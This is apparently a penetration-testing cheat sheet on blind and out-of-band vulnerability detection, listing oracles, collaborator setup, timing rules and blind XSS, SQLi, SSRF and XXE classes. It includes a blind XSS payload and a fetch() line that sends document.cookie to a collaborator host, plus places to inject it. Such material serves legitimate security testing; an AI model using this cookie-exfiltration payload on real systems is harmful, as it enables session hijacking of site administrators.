# Blind and Out-of-Band

When nothing comes back in the response, move the oracle outside it.

---

## Oracles

| Oracle | Cost | Notes |
|---|---|---|
| DNS | free | works through most egress |
| HTTP callback | free | proves a full request |
| SMTP | free | some egress allows only 25 |
| Timing | free | noisy; 3 runs minimum |
| Error text | free | only if the app echoes |
| Second-order storage | free | read it back later |
| Log file | cheap | if you can read logs |

---

## Setup

- A collaborator domain (Burp Collaborator, interactsh, `oast.pro`).
- A wildcard DNS zone you control, with a logging endpoint.
- Unique token per payload so you know which fired.

---

## Blind classes

- Blind SSRF (DNS only)
- Blind SQLi (time or OOB)
- Blind command injection (time or OOB)
- Blind XXE (OOB parameter entity)
- Blind XSS (fires in an admin panel later)
- Blind SSTI (renders only in a PDF)

---

## Blind XSS

Payload that reports back when an admin views it:

```html
<script src="https://collab/x.js"></script>
```

or inline with `fetch('https://collab/?c='+document.cookie)`.

Inject into: support tickets, contact forms, user-agent, filenames, profile fields,
"notes" fields, and anything an admin reviews.

---

## Timing discipline

- Baseline: 5 runs, take the median.
- Probe: 5 runs, take the median.
- A real delta is >3× the baseline jitter and >1 s absolute.
- Always confirm with a second method (OOB or content).

---

## Go deeper

1. Prefer DNS over HTTP — fewer egress filters block 53.
2. Use a unique subdomain per payload.
3. For blind SQLi, use OOB before time if egress allows.
4. Check whether the app stores the fetched result — then read it.
5. Keep the collaborator open for the whole run; blind bugs fire late.

---

## Related

- `00-core/impact-proof.md`
- `06-advanced/exploit-chaining.md`
- `08-validation/report-writing.md`
